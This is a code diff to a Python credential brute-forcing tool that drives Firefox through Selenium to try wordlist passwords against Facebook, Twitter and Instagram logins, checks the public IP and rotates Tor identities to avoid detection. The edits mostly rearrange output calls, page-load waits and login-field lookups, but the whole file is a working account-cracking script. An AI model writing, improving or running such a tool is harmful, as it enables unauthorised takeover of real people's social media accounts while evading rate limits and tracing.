@@ -74,7 +74,7 @@ def main():
 
         Hash = data.rsplit(":",1)[1]
 
-    print("[ " + G + "ok" + W + " ]" + " Successfully Scanned Password : " + Hash)
+    sys.stdout.write("[ " + G + "ok" + W + " ]" + " Successfully Scanned Password : " + Hash)
 
     Bruter(service, username, wordlist, delay).execute()
 
@@ -108,16 +108,13 @@ class Bruter(object):
 
         if not controller:
 
-            print("[ " + R + "Error" + W + " ]" + " Stem controller not running" + W)
+            sys.stdout.write("[ " + R + "Error" + W + " ]" + " Stem controller not running" + W)
 
             self.stopTOR()
 
             exit(1)
-       
 
-        print("[ " + G + "ok" + W + " ]" + " Stem controller running\n")
-
-        print("- Bruteforce starting ( Delay = %s sec ) -\n" % self.delay)
+        sys.stdout.write("[ " + G + "ok" + W + " ]" + " Stem controller running\n")
 
 
     def setIP(self):        # Changing Public IP by sending signal newnym
@@ -133,11 +130,11 @@ class Bruter(object):
   
         if self.usercheck(self.username, self.service) == 1:
 
-            print("[ " + R + "Error" + W + " ]" + " Username Does not Exist" + W)
+            print("[ " + R + "Error" + W + " ]" + " Username Does not Exist\n" + W)
             
             exit(1)
 
-        print("[ " + G + "ok" + W + " ]" + " Checking Account Existence")
+        print("[ " + G + "ok" + W + " ]" + " Checking Account Existence\n")
 
         self.webBruteforce(self.username, self.wordlist, self.service, self.delay)
 
@@ -149,6 +146,8 @@ class Bruter(object):
        display.start()
 
        driver = webdriver.Firefox()
+
+       self.Tor_Check()
 
        try:
 
@@ -184,6 +183,8 @@ class Bruter(object):
 
     def webBruteforce(self, username, wordlist, service, delay):
 
+        my_ip = urlopen("http://ip.42.pl/raw").read()
+
         global driver
 
         driver = webdriver.Firefox()
@@ -191,6 +192,10 @@ class Bruter(object):
         if service == "facebook":
 
             driver.get("https://touch.facebook.com/login?soft=auth/")
+
+            WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
+
+            elem = driver.find_element_by_name("email")
             
         elif service == "twitter":
 
@@ -198,31 +203,22 @@ class Bruter(object):
 
             WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
 
+            elem = driver.find_element_by_name("session[username_or_email]")
+
         elif service == "instagram":
 
             driver.get("https://www.instagram.com/accounts/login/?force_classic_login")
 
-        self.Tor_Check()
-
-
-        if service == "facebook":
-
-            elem = driver.find_element_by_name("email")
-
-        elif service == "twitter":
-
-            elem = driver.find_element_by_name("session[username_or_email]")
-
-        elif service == "instagram":
+            WebDriverWait(driver, 30).until(lambda d: d.execute_script('return document.readyState') == 'complete')
 
             elem = driver.find_element_by_name("username")
 
         elem.clear()
         elem.send_keys(username)
 
-        my_ip = urlopen("http://ip.42.pl/raw").read()
-
         j=0 
+
+        print("\n- Bruteforce starting ( Delay = %s sec ) -\n" % self.delay)
 
         wordlist = open(wordlist, 'r')
 
